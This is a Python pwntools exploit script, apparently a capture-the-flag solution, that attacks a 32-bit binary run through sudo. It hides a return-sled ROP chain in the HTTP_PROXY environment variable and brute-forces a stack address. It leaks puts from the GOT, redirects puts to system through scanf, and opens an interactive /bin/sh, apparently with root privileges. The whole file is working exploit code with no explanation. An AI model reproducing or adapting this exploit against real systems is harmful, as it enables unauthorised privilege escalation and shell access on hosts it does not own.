from pwn import *
from random import randint

context.clear(arch="i386", kernel="amd64")

# Local
# e = ELF("./funprogram")
# libc = ELF("/lib32/libc.so.6")
# argv = [e.path]

# Remote
e = ELF("/usr/local/bin/funprogram")
libc = ELF("/lib/i386-linux-gnu/libc.so.6")
argv = ["sudo", "--preserve-env=HTTP_PROXY", e.path]

r = ROP(e)

STACK_MEMORY_GUESS = 0xFFFDE400

# libc leak
r.raw(e.symbols["puts"])  # function call (puts)
r.raw(0x08049022)  # return address of puts (pop ebx ; ret)
r.raw(e.got["puts"])  # arg0 to puts

scanf_input_str = next(e.search(b"%10s\x00"))

# puts -> system
r.raw(e.symbols["__isoc99_scanf"])  # function call (scanf)
r.raw(0x08049282)  # return address of scanf (pop edi ; pop ebp ; ret)
r.raw(scanf_input_str)  # scanf arg0 (%10s)
r.raw(e.got["puts"])  # scanf arg1

# trigger main again
r.raw(e.symbols["main"])

ret_sled = p32(0x0804900E) * (1024 // 4) * 127
payload = ret_sled + r.chain()

while 1:
    c = process(argv, env={"HTTP_PROXY": payload + b"X" * randint(0, 3)})

    # context.terminal = ["tmux", "splitw", "-h"]
    # gdb.attach(
    #     c,
    #     """
    # continue
    # """.strip(),
    # )

    c.recvuntil(b"Enter an integer:\n")
    c.sendline(b"AAAA" + p32(STACK_MEMORY_GUESS + 4))
    print(c.recvline())

    try:
        puts_addr = u32(c.recvline()[:4])
    except EOFError:
        c.close()
        continue

    system_addr = puts_addr + (libc.symbols["system"] - libc.symbols["puts"])

    c.sendline(p32(system_addr))
    c.sendline(b"/bin/sh")

    c.interactive()

    break
